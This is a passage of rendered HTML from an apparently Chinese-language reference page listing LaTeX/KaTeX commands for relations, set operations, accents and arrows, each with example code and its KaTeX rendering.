style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span>。<br />  小于等于运算，符号：<code>\leq</code>，如：<code>x+y \leq z</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>+</mo><mi>y</mi><mo>≤</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x+y \leq z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8304100000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span>。<br />  不等于运算，符号：<code>\neq</code>，如：<code>x+y \neq z</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>+</mo><mi>y</mi><mi mathvariant="normal">≠</mi><mi>z</mi></mrow><annotation encoding="application/x-tex">x+y \neq z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span>。<br />  不大于等于运算，符号：<code>\ngeq</code>，如：<code>x+y \ngeq z</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>+</mo><mi>y</mi><mo>≱</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x+y \ngeq z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.09657em;vertical-align:-0.30274em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">≱</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span>。<br />  不小于等于运算，符号：<code>\nleq</code>，如：<code>x+y \nleq z</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>+</mo><mi>y</mi><mo>≰</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x+y \nleq z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.09657em;vertical-align:-0.30274em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">≰</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span>。<br />  约等于运算，符号：<code>\approx</code>，如：<code>x+y \approx z</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>+</mo><mi>y</mi><mo>≈</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x+y \approx z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6775599999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span>。<br />  恒定等于运算，符号：<code>\equiv</code>，如：<code>x+y \equiv z</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>+</mo><mi>y</mi><mo>≡</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x+y \equiv z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65819em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span>。</p><h2 id="集合运算"><a class="markdownIt-Anchor" href="#集合运算"></a> 集合运算</h2><p>  属于运算，符号：<code>\in</code>，如：<code>x \in y</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>∈</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \in y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  不属于运算，符号：<code>\notin</code>，如：<code>x \notin y</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi mathvariant="normal">∉</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">x \notin y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mord"><span class="mrel">∈</span></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.75em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="llap"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="inner"><span class="mord"><span class="mord">/</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.25em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  子集运算，符号：<code>\subset</code>，如：<code>x \subset y</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>⊂</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \subset y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  子集运算，符号：<code>\supset</code>，如：<code>x \supset y</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>⊃</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \supset y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊃</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  真子集运算，符号：<code>\subseteq</code>，如：<code>x \subseteq y</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>⊆</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \subseteq y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  真子集运算，符号：<code>\supseteq</code>，如：<code>x \supseteq y</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>⊇</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \supseteq y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊇</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  非真子集运算，符号：<code>\subsetneq</code>，如：<code>x \subsetneq y</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>⊊</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \subsetneq y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⊊</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  非真子集运算，符号：<code>\supsetneq</code>，如：<code>x \supsetneq y</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>⊋</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \supsetneq y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⊋</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  并集运算，符号：<code>\cup</code>，如：<code>x \cup y</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>∪</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \cup y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  交集运算，符号：<code>\cap</code>，如：<code>x \cap y</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>∩</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \cap y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  差集运算，符号：<code>\setminus</code>，如：<code>x \setminus y</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>∖</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \setminus y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∖</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  同或运算，符号：<code>\bigodot</code>，如：<code>x \bigodot y</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>⨀</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \bigodot y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">⨀</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  同与运算，符号：<code>\bigotimes</code>，如：<code>x \bigotimes y</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>⨂</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \bigotimes y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">⨂</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  实数集合，符号：<code>\mathbb&#123;集合名&#125;</code>，如：<code>\mathbb&#123;R&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="double-struck">R</mi></mrow><annotation encoding="application/x-tex">\mathbb{R}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord"><span class="mord mathbb">R</span></span></span></span></span>。<br />  自然数集合，符号：<code>\mathbb&#123;集合名&#125;</code>，如：<code>\mathbb&#123;Z&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="double-struck">Z</mi></mrow><annotation encoding="application/x-tex">\mathbb{Z}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord"><span class="mord mathbb">Z</span></span></span></span></span>。<br />  空集，符号：<code>\emptyset</code>，如：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∅</mi></mrow><annotation encoding="application/x-tex">\emptyset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">∅</span></span></span></span>。</p><h2 id="数学符号"><a class="markdownIt-Anchor" href="#数学符号"></a> 数学符号</h2><p>  无穷，符号：<code>\infty</code>，如：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∞</mi></mrow><annotation encoding="application/x-tex">\infty</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord">∞</span></span></span></span>。<br />  虚数，符号：<code>\imath</code>，如：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ı</mi></mrow><annotation encoding="application/x-tex">\imath</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathit latin_fallback">ı</span></span></span></span>。<br />  虚数，符号：<code>\jmath</code>，如：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ȷ</mi></mrow><annotation encoding="application/x-tex">\jmath</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathit latin_fallback">ȷ</span></span></span></span>。</p><p>  数学符号，符号<code>\hat&#123;字母&#125;</code>，如：<code>\hat&#123;a&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>a</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">^</span></span></span></span></span></span></span></span></span>。<br />  数学符号，符号<code>\check&#123;字母&#125;</code>，如：<code>\check&#123;a&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>a</mi><mo>ˇ</mo></mover></mrow><annotation encoding="application/x-tex">\check{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.62847em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.62847em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">ˇ</span></span></span></span></span></span></span></span></span>。<br />  数学符号，符号<code>\breve&#123;字母&#125;</code>，如：<code>\breve&#123;a&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>a</mi><mo>˘</mo></mover></mrow><annotation encoding="application/x-tex">\breve{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">˘</span></span></span></span></span></span></span></span></span>。<br />  数学符号，符号<code>\tilde&#123;字母&#125;</code>，如：<code>\tilde&#123;a&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>a</mi><mo>~</mo></mover></mrow><annotation encoding="application/x-tex">\tilde{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6678599999999999em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6678599999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-3.35em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">~</span></span></span></span></span></span></span></span></span>。<br />  数学符号，符号<code>\bar&#123;字母&#125;</code>，如：<code>\bar&#123;a&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>a</mi><mo>ˉ</mo></mover></mrow><annotation encoding="application/x-tex">\bar{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.56778em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">ˉ</span></span></span></span></span></span></span></span></span>。<br />  矢量符号，符号<code>\vec&#123;字母&#125;</code>，如：<code>\vec&#123;a&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>a</mi><mo>⃗</mo></mover></mrow><annotation encoding="application/x-tex">\vec{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.714em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.2355em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span>。<br />  数学符号，符号<code>\acute&#123;字母&#125;</code>，如：<code>\acute&#123;a&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>a</mi><mo>ˊ</mo></mover></mrow><annotation encoding="application/x-tex">\acute{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">ˊ</span></span></span></span></span></span></span></span></span>。<br />  数学符号，符号<code>\grave&#123;字母&#125;</code>，如：<code>\grave&#123;a&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>a</mi><mo>ˋ</mo></mover></mrow><annotation encoding="application/x-tex">\grave{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">ˋ</span></span></span></span></span></span></span></span></span>。<br />  一阶导数符号，符号<code>\dot&#123;字母&#125;</code>，如：<code>\dot&#123;a&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>a</mi><mo>˙</mo></mover></mrow><annotation encoding="application/x-tex">\dot{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66786em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.66786em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.13889em;">˙</span></span></span></span></span></span></span></span></span>。<br />  二阶导数符号，符号<code>\ddot&#123;字母&#125;</code>，如：<code>\ddot&#123;a&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>a</mi><mo>¨</mo></mover></mrow><annotation encoding="application/x-tex">\ddot{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66786em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.66786em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">¨</span></span></span></span></span></span></span></span></span>。</p><p>  上箭头，符号：<code>\uparrow</code>，如：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>↑</mo></mrow><annotation encoding="application/x-tex">\uparrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel">↑</span></span></span></span>。<br />  上箭头，符号：<code>\Uparrow</code>，如：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⇑</mo></mrow><annotation encoding="application/x-tex">\Uparrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel">⇑</span></span></span></span>。<br />  下箭头，符号：<code>\downarrow</code>，如：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>↓</mo></mrow><annotation encoding="application/x-tex">\downarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel">↓</span></span></span></span>。<br />  下箭头，符号：<code>\Downarrow</code>，如：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⇓</mo></mrow><annotation encoding="application/x-tex">\Downarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel">⇓</span></span></span></span>。<br />  左箭头，符号：<code>\leftarrow</code>，如：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>←</mo></mrow><annotation encoding="application/x-tex">\leftarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">←</span></span></span></span>。<br />  左箭头，符号：<code>\Leftarrow</code>，如：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⇐</mo></mrow><annotation encoding="application/x-tex">\Leftarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">⇐</span></span></span></span>。<br />  右箭头，符号：<code>\rightarrow</code>，如：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span 